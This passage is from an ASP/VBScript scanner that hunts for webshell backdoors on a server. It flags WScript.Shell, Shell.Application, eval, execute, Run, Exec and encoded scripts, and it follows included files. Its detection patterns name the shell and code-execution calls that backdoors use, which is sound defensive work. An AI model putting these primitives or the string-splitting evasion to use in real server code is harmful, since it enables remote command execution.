	tStream.LoadFromFile FilePath
	If err Then Exit Sub end if
	tStream.type = 2
	tStream.charset = "GB2312"
	Do Until tStream.EOS
		filetxt = filetxt & LCase(replace(tStream.ReadText(102400), Chr(0), ""))
	Loop
	tStream.close()
	Set tStream = Nothing

	Set FSOs = CreateObject("Scripting.FileSystemObject")	
	if len(filetxt) >0 then
		filetxt = vbcrlf & filetxt
			
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End if
			
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application 或者 clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			If instr( filetxt, chr(-22048)) then
				Report = Report&"<tr><td>"&temp&"</td><td>无</td><td><font color=red>使用 Unicode 编码 ASP 代码</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>似乎脚本被加密了，一般ASP文件是不会加密的<a href=plugins/decoder.asp?path="&server.URLEncode(filepath)&" target=_blank>[解密]</a></font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()函数可以执行任意ASP代码，被一些后门利用。其形式一般是：ev"&"al(X)<br>但是javascript代码中也可以使用，有可能是误报。"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()函数可以执行任意ASP代码，被一些后门利用。其形式一般是：ex"&"ecute(X)</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Crea"&"teTextFile|.O"&"penTextFile</td><td>使用了FSO的CreateTextFile|OpenTextFile函数读写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\.SaveT"&"oFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Sa"&"veToFile</td><td>使用了Stream或者JMail的SaveToFile函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\.Sa"&"ve\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Sa"&"ve</td><td>使用了XMLHTTP的Save函数写文件"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
		
			regEx.Pattern = "set\s*.*\s*=\s*server\s"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Set xxx=Se"&"rver</td><td><font color=red>发现Set xxx=Ser" & jj & "ver，请管理员仔细检查是否调用.execute</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "Server.(Ex"&"ecute|Transfer)([ \t]*|\()[^""]\)"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Server.Ex"&"ecute</td><td><font color=red>不能跟踪检查Server.e"&"xecute()函数执行的文件。请管理员自行检查</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
		
			regEx.Pattern = "\.R"&"un\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Ru"&"n</td><td><font color=red>发现 WScript 的 Run 函数</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
	
			regEx.Pattern = "\.Ex"&"ec\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Ex"&"ec</td><td><font color=red>发现 WScript 的 Exec 函数</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
		
			regEx.Pattern = "\.Shel"&"lExecute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.ShellE"&"xecute</td><td><font color=red>发现 Application 的 ShellExecute 函数</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			Set regEx = Nothing
			
	
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		
		
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*'.*'"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, "'") + 1, Len(Match.Value) - Instr(Match.Value, "'") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		
		'Check include virtual with "
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		
		
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*'.*'"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, "'") + 1, Len(Match.Value) - Instr(Match.Value, "'") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
				
	
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
			
	
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing

	end if
		set fsos = nothing

End Sub

%>